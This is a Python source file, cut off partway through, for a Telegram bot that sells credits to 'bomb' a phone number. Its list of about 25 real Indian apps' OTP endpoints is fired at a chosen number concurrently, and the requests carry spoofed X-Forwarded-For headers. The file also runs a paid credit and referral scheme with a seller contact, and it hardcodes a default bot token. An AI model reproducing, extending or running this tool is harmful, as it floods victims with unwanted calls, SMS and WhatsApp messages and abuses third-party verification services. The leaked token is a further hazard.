# ============================
# bot.py - FULL FEATURES WITH CREDIT REDEEM SYSTEM
# ============================

import asyncio
import aiohttp
import time
import random
import json
import sqlite3
import logging
import string
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.ext import ApplicationBuilder
import os
import sys

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

# Bot Configuration
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8842797548:AAE4WQ5Rgan8hu-Q3wRW7lM4KCZ9FH-GHmA")
OWNER_ID = int(os.environ.get("OWNER_ID", "8167337368"))
CHANNEL_LINK = "https://t.me/+C4Nq8BYJ4yliM2Y9"
CHANNEL_USERNAME = "https://t.me/+C4Nq8BYJ4yliM2Y9"
FREE_CREDITS = 50
CREDIT_COST_SMS = 2
CREDIT_COST_CALL = 2

# Database setup
def init_db():
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, 
                  credits INTEGER DEFAULT 0, 
                  total_attacks INTEGER DEFAULT 0,
                  total_sms_sent INTEGER DEFAULT 0,
                  total_calls_sent INTEGER DEFAULT 0,
                  total_whatsapp_sent INTEGER DEFAULT 0,
                  referral_code TEXT UNIQUE,
                  referred_by INTEGER,
                  first_use INTEGER DEFAULT 0,
                  username TEXT,
                  first_name TEXT,
                  last_name TEXT,
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                  last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS referrals
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  referrer_id INTEGER,
                  referred_id INTEGER,
                  credits_earned INTEGER,
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS attacks
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  phone TEXT,
                  attack_count INTEGER DEFAULT 0,
                  sms_count INTEGER DEFAULT 0,
                  call_count INTEGER DEFAULT 0,
                  whatsapp_count INTEGER DEFAULT 0,
                  credits_used INTEGER DEFAULT 0,
                  status TEXT,
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS redeem_codes
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  code TEXT UNIQUE,
                  credits INTEGER DEFAULT 0,
                  created_by INTEGER,
                  used_by INTEGER DEFAULT NULL,
                  status TEXT DEFAULT 'active',
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                  expires_at TIMESTAMP DEFAULT NULL,
                  used_at TIMESTAMP DEFAULT NULL)''')
    conn.commit()
    conn.close()

init_db()

# Database helper functions
def get_user(user_id):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def add_user(user_id, username=None, first_name=None, last_name=None):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    referral_code = f"REF{random.randint(100000, 999999)}"
    c.execute("""INSERT OR IGNORE INTO users 
                 (user_id, credits, referral_code, username, first_name, last_name) 
                 VALUES (?, ?, ?, ?, ?, ?)""", 
              (user_id, FREE_CREDITS, referral_code, username, first_name, last_name))
    conn.commit()
    conn.close()

def update_user_info(user_id, username=None, first_name=None, last_name=None):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    if username:
        c.execute("UPDATE users SET username = ? WHERE user_id = ?", (username, user_id))
    if first_name:
        c.execute("UPDATE users SET first_name = ? WHERE user_id = ?", (first_name, user_id))
    if last_name:
        c.execute("UPDATE users SET last_name = ? WHERE user_id = ?", (last_name, user_id))
    c.execute("UPDATE users SET last_active = CURRENT_TIMESTAMP WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def update_credits(user_id, amount):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    conn.close()

def get_credits(user_id):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id = ?", (user_id,))
    credits = c.fetchone()
    conn.close()
    return credits[0] if credits else 0

def add_referral(referrer_id, referred_id):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("INSERT INTO referrals (referrer_id, referred_id, credits_earned) VALUES (?, ?, ?)", 
              (referrer_id, referred_id, 10))
    c.execute("UPDATE users SET credits = credits + 10 WHERE user_id = ?", (referrer_id,))
    conn.commit()
    conn.close()

def log_attack(user_id, phone, attack_count, sms_count, call_count, whatsapp_count, credits_used, status="completed"):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("""INSERT INTO attacks 
                 (user_id, phone, attack_count, sms_count, call_count, whatsapp_count, credits_used, status) 
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
              (user_id, phone, attack_count, sms_count, call_count, whatsapp_count, credits_used, status))
    c.execute("UPDATE users SET total_attacks = total_attacks + 1 WHERE user_id = ?", (user_id,))
    c.execute("UPDATE users SET total_sms_sent = total_sms_sent + ? WHERE user_id = ?", (sms_count, user_id))
    c.execute("UPDATE users SET total_calls_sent = total_calls_sent + ? WHERE user_id = ?", (call_count, user_id))
    c.execute("UPDATE users SET total_whatsapp_sent = total_whatsapp_sent + ? WHERE user_id = ?", (whatsapp_count, user_id))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users ORDER BY created_at DESC")
    users = c.fetchall()
    conn.close()
    return users

def get_user_stats(user_id):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("""SELECT 
                 credits, total_attacks, total_sms_sent, total_calls_sent, 
                 total_whatsapp_sent, referral_code, created_at 
                 FROM users WHERE user_id = ?""", (user_id,))
    stats = c.fetchone()
    conn.close()
    return stats

# REDEEM CODE FUNCTIONS
def generate_redeem_code():
    """Generate a unique redeem code"""
    # Format: XXX-XXX-XXX (alphanumeric)
    chars = string.ascii_uppercase + string.digits
    code = ''
    for i in range(3):
        if i > 0:
            code += '-'
        for j in range(3):
            code += random.choice(chars)
    return code

def create_redeem_code(credits, created_by, expiry_days=30):
    """Create a new redeem code"""
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    
    # Generate unique code
    while True:
        code = generate_redeem_code()
        c.execute("SELECT id FROM redeem_codes WHERE code = ?", (code,))
        if not c.fetchone():
            break
    
    expires_at = datetime.now() + timedelta(days=expiry_days)
    
    c.execute("""INSERT INTO redeem_codes 
                 (code, credits, created_by, expires_at) 
                 VALUES (?, ?, ?, ?)""",
              (code, credits, created_by, expires_at.strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()
    return code

def get_redeem_code_info(code):
    """Get redeem code information"""
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("SELECT * FROM redeem_codes WHERE code = ?", (code,))
    code_info = c.fetchone()
    conn.close()
    return code_info

def use_redeem_code(code, user_id):
    """Use a redeem code and add credits to user"""
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    
    # Check if code exists and is valid
    c.execute("SELECT id, credits, status, expires_at FROM redeem_codes WHERE code = ?", (code,))
    result = c.fetchone()
    
    if not result:
        conn.close()
        return None, "Code not found"
    
    code_id, credits, status, expires_at = result
    
    # Check if expired
    if expires_at and datetime.now() > datetime.strptime(expires_at, '%Y-%m-%d %H:%M:%S'):
        c.execute("UPDATE redeem_codes SET status = 'expired' WHERE id = ?", (code_id,))
        conn.commit()
        conn.close()
        return None, "Code has expired"
    
    if status != 'active':
        conn.close()
        return None, f"Code is {status}"
    
    # Use the code
    c.execute("UPDATE redeem_codes SET status = 'used', used_by = ?, used_at = CURRENT_TIMESTAMP WHERE id = ?", 
              (user_id, code_id))
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (credits, user_id))
    conn.commit()
    conn.close()
    
    return credits, f"Successfully redeemed {credits} credits!"

def get_all_redeem_codes():
    """Get all redeem codes"""
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("SELECT * FROM redeem_codes ORDER BY created_at DESC")
    codes = c.fetchall()
    conn.close()
    return codes

def delete_redeem_code(code):
    """Delete a redeem code"""
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("DELETE FROM redeem_codes WHERE code = ?", (code,))
    conn.commit()
    conn.close()
    return c.rowcount > 0

async def check_channel_membership(user_id):
    """Check if user is member of required channel"""
    try:
        # For now returning True - will implement proper check later
        return True
    except:
        return True

# API Collection
ULTIMATE_APIS = [
    # Call APIs
    {
        "name": "Tata Capital Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}',
        "type": "call"
    },
    {
        "name": "1MG Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}',
        "type": "call"
    },
    {
        "name": "Swiggy Call",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "type": "call"
    },
    {
        "name": "Myntra Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "type": "call"
    },
    {
        "name": "Flipkart Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "type": "call"
    },
    {
        "name": "Paytm Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "type": "call"
    },
    {
        "name": "Zomato Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice",
        "type": "call"
    },
    {
        "name": "MakeMyTrip Call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "type": "call"
    },
    {
        "name": "Ola Call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "type": "call"
    },
    {
        "name": "Uber Call",
        "url": "https://auth.uber.com/v2/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "type": "call"
    },
    # WhatsApp APIs
    {
        "name": "KPN WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
        "method": "POST",
        "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f"},
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}',
        "type": "whatsapp"
    },
    {
        "name": "Foxy WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}',
        "type": "whatsapp"
    },
    {
        "name": "Stratzy WhatsApp",
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}',
        "type": "whatsapp"
    },
    # SMS APIs
    {
        "name": "Lenskart SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}',
        "type": "sms"
    },
    {
        "name": "NoBroker SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&countryCode=IN",
        "type": "sms"
    },
    {
        "name": "PharmEasy SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "type": "sms"
    },
    {
        "name": "Wakefit SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "type": "sms"
    },
    {
        "name": "Byju's SMS",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "type": "sms"
    },
    {
        "name": "Hungama SMS",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91"}}',
        "type": "sms"
    },
    {
        "name": "Meru Cab SMS",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile_number={phone}",
        "type": "sms"
    },
    {
        "name": "Doubtnut SMS",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}',
        "type": "sms"
    },
    {
        "name": "Snitch SMS",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}',
        "type": "sms"
    },
    {
        "name": "ShipRocket SMS",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}',
        "type": "sms"
    },
    {
        "name": "Rapido SMS",
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "type": "sms"
    },
    {
        "name": "Nykaa SMS",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"source=sms&mobile_number={phone}",
        "type": "sms"
    }
]

async def bomb_phone(phone, attack_count, attack_type="all"):
    """Execute bombing attack on phone number with specified count"""
    success_count = 0
    sms_count = 0
    call_count = 0
    whatsapp_count = 0
    
    if attack_type == "all":
        apis_to_use = ULTIMATE_APIS
    else:
        apis_to_use = [api for api in ULTIMATE_APIS if api["type"] == attack_type]
    
    apis_to_use = apis_to_use[:attack_count]
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        for api in apis_to_use:
            task = asyncio.create_task(send_attack(session, api, phone))
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for i, result in enumerate(results):
            if result is True:
                success_count += 1
                api_type = apis_to_use[i]["type"] if i < len(apis_to_use) else "unknown"
                if api_type == "sms":
                    sms_count += 1
                elif api_type == "call":
                    call_count += 1
                elif api_type == "whatsapp":
                    whatsapp_count += 1
    
    return success_count, sms_count, call_count, whatsapp_count

async def send_attack(session, api, phone):
    try:
        url = api["url"](phone) if callable(api["url"]) else api["url"]
        headers = api["headers"].copy()
        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        if api["method"] == "POST":
            data = api["data"](phone) if api["data"] else None
            async with session.post(url, headers=headers, data=data, timeout=5, ssl=False) as response:
                if response.status in [200, 201, 202]:
                    return True
        else:
            async with session.get(url, headers=headers, timeout=5, ssl=False) as response:
                if response.status in [200, 201, 202]:
                    return True
        return False
    except:
        return False

# Bot Command Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    first_name = update.effective_user.first_name or ""
    last_name = update.effective_user.last_name or ""
    
    update_user_info(user_id, username, first_name, last_name)
    
    if not await check_channel_membership(user_id):
        keyboard = [[InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"⚠️ *Please join our channel first!*\n\n"
            f"Click below:\n{CHANNEL_LINK}",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    user = get_user(user_id)
    if not user:
        add_user(user_id, username, first_name, last_name)
        
        if context.args and len(context.args) > 0:
            referral_code = context.args[0]
            conn = sqlite3.connect('bot_database.db')
            c = conn.cursor()
            c.execute("SELECT user_id FROM users WHERE referral_code = ?", (referral_code,))
            referrer = c.fetchone()
            conn.close()
            if referrer and referrer[0] != user_id:
                add_referral(referrer[0], user_id)
        
        credits = get_credits(user_id)
        await update.message.reply_text(
            f"🎉 *Welcome {first_name}!*\n\n"
            f"✅ You received {FREE_CREDITS} FREE credits!\n"
            f"💰 Balance: {credits} credits\n\n"
            f"📱 *Commands:*\n"
            f"/attack [phone] [count] - Start bombing\n"
            f"/redeem [code] - Redeem credit code\n"
            f"/balance - Check credits\n"
            f"/refer - Get referral link\n"
            f"/stats - Your statistics\n"
            f"/help - All commands",
            parse_mode='Markdown'
        )
    else:
        credits = get_credits(user_id)
        await update.message.reply_text(
            f"👋 *Welcome back {first_name}!*\n\n"
            f"💰 Balance: {credits} credits\n"
            f"📱 Use /attack [phone] [count] to start bombing",
            parse_mode='Markdown'
        )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id):
        await update.message.reply_text(f"⚠️ Please join channel first: {CHANNEL_LINK}")
        return
    
    user = get_user(user_id)
    if not user:
        await update.message.reply_text("❌ Please use /start first!")
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ *Usage:* `/attack [phone] [count]`\n"
            "Example: `/attack 9876543210 5`\n\n"
            "📱 Phone: 10 digits (Indian number)\n"
            "📊 Count: Number of attacks (1-50)",
            parse_mode='Markdown'
        )
        return
    
    phone = context.args[0]
    attack_count = 5
    
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Invalid phone number! Must be 10 digits.")
        return
    
    if len(context.args) > 1:
        try:
            attack_count = int(context.args[1])
            if attack_count < 1:
                attack_count = 1
            elif attack_count > 50:
                attack_count = 50
        except ValueError:
            attack_count = 5
    
    credits_needed = attack_count * CREDIT_COST_SMS
    credits = get_credits(user_id)
    
    if credits < credits_needed:
        keyboard = [[InlineKeyboardButton("💰 Buy Credits", url="https://t.me/Luafucker")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"❌ *Insufficient credits!*\n\n"
            f"💰 Balance: {credits}\n"
            f"⚡ Required: {credits_needed}\n"
            f"📊 Attack count: {attack_count}",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    update_credits(user_id, -credits_needed)
    
    status_msg = await update.message.reply_text(
        f"🚀 *Starting attack on +91{phone}*\n"
        f"📊 Count: {attack_count}\n"
        f"💰 Credits used: {credits_needed}\n"
        f"⏳ Please wait...",
        parse_mode='Markdown'
    )
    
    try:
        success_count, sms_count, call_count, whatsapp_count = await bomb_phone(phone, attack_count, "all")
        
        log_attack(user_id, phone, attack_count, sms_count, call_count, whatsapp_count, credits_needed, "completed")
        
        remaining_credits = get_credits(user_id)
        
        await status_msg.edit_text(
            f"✅ *Attack completed on +91{phone}*\n\n"
            f"📡 *Results:*\n"
            f"• Successful: {success_count}/{attack_count}\n"
            f"• 📞 Calls: {call_count}\n"
            f"• 💬 SMS: {sms_count}\n"
            f"• 📱 WhatsApp: {whatsapp_count}\n\n"
            f"💰 Credits used: {credits_needed}\n"
            f"💰 Remaining: {remaining_credits}",
            parse_mode='Markdown'
        )
    except Exception as e:
        await status_msg.edit_text(f"❌ Attack failed: {str(e)}")
        update_credits(user_id, credits_needed)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeem credit code command"""
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id):
        await update.message.reply_text(f"⚠️ Please join channel first: {CHANNEL_LINK}")
        return
    
    user = get_user(user_id)
    if not user:
        await update.message.reply_text("❌ Please use /start first!")
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ *Usage:* `/redeem [code]`\n"
            "Example: `/redeem ABC-123-DEF`\n\n"
            "Get redeem codes from admin or events!",
            parse_mode='Markdown'
        )
        return
    
    code = context.args[0].upper()
    
    # Check if code exists
    result = use_redeem_code(code, user_id)
    
    if result[0] is None:
        await update.message.reply_text(f"❌ {result[1]}")
    else:
        credits_earned, message = result
        new_balance = get_credits(user_id)
        await update.message.reply_text(
            f"✅ *Code Redeemed Successfully!*\n\n"
            f"💰 Credits Added: +{credits_earned}\n"
            f"💰 New Balance: {new_balance}\n\n"
            f"🎉 {message}",
            parse_mode='Markdown'
        )

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    credits = get_credits(user_id)
    
    keyboard = [[InlineKeyboardButton("💰 Buy More", url="https://t.me/Luafucker")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"💰 *Balance*\n\n"
        f"Total Credits: {credits}\n"
        f"Cost per attack: {CREDIT_COST_SMS} credits\n"
        f"Can perform: {credits // CREDIT_COST_SMS} attacks",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    stats_data = get_user_stats(user_id)
    if not stats_data:
        await update.message.reply_text("❌ Please use /start first!")
        return
    
    credits, total_attacks, total_sms, total_calls, total_whatsapp, referral_code, created_at = stats_data
    
    await update.message.reply_text(
        f"📊 *Your Statistics*\n\n"
        f"💰 Credits: {credits}\n"
        f"📱 Total Attacks: {total_attacks}\n"
        f"💬 SMS Sent: {total_sms}\n"
        f"📞 Calls Sent: {total_calls}\n"
        f"📱 WhatsApp Sent: {total_whatsapp}\n"
        f"👥 Referral Code: `{referral_code}`\n"
        f"📅 Joined: {created_at}",
        parse_mode='Markdown'
    )

async def refer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    user = get_user(user_id)
    if not user:
        await update.message.reply_text("❌ Please use /start first!")
        return
    
    referral_code = user[2] if len(user) > 2 else "N/A"
    bot_username = context.bot.username
    
    await update.message.reply_text(
        f"👥 *Referral System*\n\n"
        f"🔑 Your Code: `{referral_code}`\n"
        f"📤 Share: `https://t.me/{bot_username}?start={referral_code}`\n\n"
        f"🎁 You get 10 credits per referral!\n"
        f"🎁 Friend gets {FREE_CREDITS} free credits!",
        parse_mode='Markdown'
    )

async def referrals(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM referrals WHERE referrer_id = ?", (user_id,))
    count = c.fetchone()[0]
    c.execute("SELECT SUM(credits_earned) FROM referrals WHERE referrer_id = ?", (user_id,))
    total_earned = c.fetchone()[0] or 0
    conn.close()
    
    await update.message.reply_text(
        f"👥 *Your Referrals*\n\n"
        f"Total: {count}\n"
        f"Credits Earned: {total_earned}",
        parse_mode='Markdown'
    )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    call_apis = len([a for a in ULTIMATE_APIS if a["type"] == "call"])
    sms_apis = len([a for a in ULTIMATE_APIS if a["type"] == "sms"])
    whatsapp_apis = len([a for a in ULTIMATE_APIS if a["type"] == "whatsapp"])
    
    users = get_all_users()
    total_users = len(users)
    
    await update.message.reply_text(
        f"📡 *System Status*\n\n"
        f"👥 Total Users: {total_users}\n"
        f"📞 Call APIs: {call_apis}\n"
        f"💬 SMS APIs: {sms_apis}\n"
        f"📱 WhatsApp APIs: {whatsapp_apis}\n"
        f"🔄 Total APIs: {len(ULTIMATE_APIS)}\n\n"
        f"✅ All APIs are LIVE!",
        parse_mode='Markdown'
    )

async def buy_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"💰 *Buy Credits*\n\n"
        f"💎 Contact @Luafucker\n\n"
        f"💳 *Price List:*\n"
        f"• 100 credits - ₹10\n"
        f"• 500 credits - ₹40\n"
        f"• 1000 credits - ₹70\n"
        f"• 5000 credits - ₹300\n"
        f"• 10000 credits - ₹500",
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"📚 *Commands*\n\n"
        f"📱 /start - Start bot\n"
        f"📱 /attack [phone] [count] - Bomb (1-50)\n"
        f"🎫 /redeem [code] - Redeem credit code\n"
        f"💰 /balance - Check credits\n"
        f"📊 /stats - Your statistics\n"
        f"👥 /refer - Get referral link\n"
        f"👥 /referrals - View referrals\n"
        f"📡 /status - API status\n"
        f"💰 /buy - Buy credits\n"
        f"📢 /help - This message\n\n"
        f"⚡ *How to use:*\n"
        f"1. Join channel first\n"
        f"2. Use /start to get free credits\n"
        f"3. Use /attack 9876543210 5 to bomb\n"
        f"4. Use /redeem ABC-123-DEF for free credits\n"
        f"5. Buy credits from @Luafucker",
        parse_mode='Markdown'
    )

# ADMIN COMMANDS
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You're not the owner!")
        return
    
    users = get_all_users()
    total_users = len(users)
    total_credits = sum(user[1] for user in users if user[1])
    total_attacks = sum(user[2] for user in users if user[2])
    total_sms = sum(user[3] for user in users if user[3])
    total_calls = sum(user[4] for user in users if user[4])
    
    keyboard = [
        [InlineKeyboardButton("📊 Users List", callback_data="admin_users")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
        [InlineKeyboardButton("💰 Add Credits", callback_data="admin_add_credits")],
        [InlineKeyboardButton("🎫 Create Redeem Code", callback_data="admin_create_redeem")],
        [InlineKeyboardButton("📋 All Redeem Codes", callback_data="admin_list_redeem")],
        [InlineKeyboardButton("📊 Full Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("📁 Export Data", callback_data="admin_export")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"👑 *Admin Panel*\n\n"
        f"👥 Users: {total_users}\n"
        f"💰 Total Credits: {total_credits}\n"
        f"📱 Attacks: {total_attacks}\n"
        f"💬 SMS: {total_sms}\n"
        f"📞 Calls: {total_calls}\n\n"
        f"Select an option:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You're not the owner!")
        return
    
    users = get_all_users()
    if not users:
        await update.message.reply_text("No users found!")
        return
    
    user_list = "📊 *User List*\n\n"
    for i, user in enumerate(users[:20], 1):
        user_list += f"{i}. ID: `{user[0]}` | Credits: {user[1]} | Attacks: {user[2]}\n"
    
    if len(users) > 20:
        user_list += f"\n... and {len(users) - 20} more users"
    
    await update.message.reply_text(user_list, parse_mode='Markdown')

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You're not the owner!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /broadcast [message]\n\n"
            "Example: /broadcast Hello everyone!",
            parse_mode='Markdown'
        )
        return
    
    message = " ".join(context.args)
    users = get_all_users()
    
    status_msg = await update.message.reply_text(f"📢 Broadcasting to {len(users)} users...")
    
    sent = 0
    failed = 0
    
    for user in users:
        try:
            await context.bot.send_message(
                user[0], 
                f"📢 *Broadcast*\n\n{message}", 
                parse_mode='Markdown'
            )
            sent += 1
            await asyncio.sleep(0.05)
        except:
            failed += 1
    
    await status_msg.edit_text(
        f"✅ *Broadcast Complete*\n\n"
        f"📤 Sent: {sent}\n"
        f"❌ Failed: {failed}\n"
        f"👥 Total: {len(users)}",
        parse_mode='Markdown'
    )

async def admin_add_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You're not the owner!")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "Usage: /addcredits [user_id] [amount]\n\n"
            "Example: /addcredits 123456789 100",
            parse_mode='Markdown'
        )
        return
    
    try:
        user_id = int(context.args[0])
        amount = int(context.args[1])
        
        user = get_user(user_id)
        if not user:
            await update.message.reply_text("❌ User not found!")
            return
        
        update_credits(user_id, amount)
        new_balance = get_credits(user_id)
        
        await update.message.reply_text(
